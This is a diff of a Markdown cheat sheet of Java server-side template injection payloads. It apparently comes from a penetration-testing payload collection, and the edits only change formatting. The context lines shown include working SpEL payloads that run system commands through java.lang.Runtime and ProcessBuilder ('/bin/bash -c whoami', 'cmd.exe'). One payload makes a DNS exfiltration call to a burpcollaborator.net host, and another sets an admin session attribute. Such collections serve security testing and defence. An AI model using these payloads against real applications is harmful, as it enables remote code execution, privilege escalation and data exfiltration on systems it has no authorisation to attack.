@@ -2,7 +2,6 @@
 
 > Server-Side Template Injection (SSTI)  is a security vulnerability that occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute arbitrary code. In Java, SSTI can be particularly dangerous due to the power and flexibility of Java-based templating engines such as JSP (JavaServer Pages), Thymeleaf, and FreeMarker.
 
-
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
@@ -36,7 +35,6 @@
     - [SpEL - Command Execution](#spel---command-execution)
 - [References](#references)
 
-
 ## Templating Libraries
 
 | Template Name | Payload Format |
@@ -49,7 +47,6 @@
 | Spring     | `*{7*7}`  |
 | Thymeleaf  | `[[ ]]`   |
 | Velocity   | `#set($X="") $X`             |
-
 
 ## Java
 
@@ -84,7 +81,7 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 ## Freemarker
 
 [Official website](https://freemarker.apache.org/)
-> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. 
+> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.
 
 You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)
 
@@ -92,9 +89,9 @@ You can try your payloads at [https://try.freemarker.apache.org](https://try.fre
 
 The template can be :
 
-* Default: `${3*3}`  
-* Legacy: `#{3*3}`
-* Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)
+- Default: `${3*3}`  
+- Legacy: `#{3*3}`
+- Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)
 
 ### Freemarker - Read File
 
@@ -130,7 +127,7 @@ ${dwf.newInstance(ec,null)("id")}
 ## Codepen
 
 [Official website](https://codepen.io/)
-> 
+>
 
 ```python
 - var x = root.process
@@ -235,7 +232,7 @@ $str.valueOf($chr.toChars($out.read()))
 
 ### Groovy - Basic injection
 
-Refer to https://groovy-lang.org/syntax.html , but `${9*9}` is the basic injection.
+Refer to [groovy-lang.org/syntax](https://groovy-lang.org/syntax.html) , but `${9*9}` is the basic injection.
 
 ### Groovy - Read File
 
@@ -289,7 +286,6 @@ ${7*7}
 ${'patt'.toString().replace('a', 'x')}
 ```
 
-
 ### SpEL - DNS Exfiltration
 
 DNS lookup
@@ -297,7 +293,6 @@ DNS lookup
 ```java
 ${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
 ```
-
 
 ### SpEL - Session Attributes
 
@@ -307,32 +302,36 @@ Modify session attributes
 ${pageContext.request.getSession().setAttribute("admin",true)}
 ```
 
-
 ### SpEL - Command Execution
 
-* Method using `java.lang.Runtime` #1 - accessed with JavaClass
+- Method using `java.lang.Runtime` #1 - accessed with JavaClass
+
     ```java
     ${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
     ```
 
-* Method using `java.lang.Runtime` #2
+- Method using `java.lang.Runtime` #2
+
     ```java
     #{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
     #{session.getAttribute("rtc").setAccessible(true)}
     #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
     ```
 
-* Method using `java.lang.Runtime` #3 - accessed with `invoke`
+- Method using `java.lang.Runtime` #3 - accessed with `invoke`
+
     ```java
     ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
     ```
 
-* Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`
+- Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`
+
     ```java
     ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
     ```
 
-* Method using `java.lang.ProcessBuilder`
+- Method using `java.lang.ProcessBuilder`
+
     ```java
     ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
     ${request.getAttribute("c").add("cmd.exe")}
@@ -341,7 +340,6 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
     ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
     ${request.getAttribute("a")}
     ```
-
 
 ## References
 
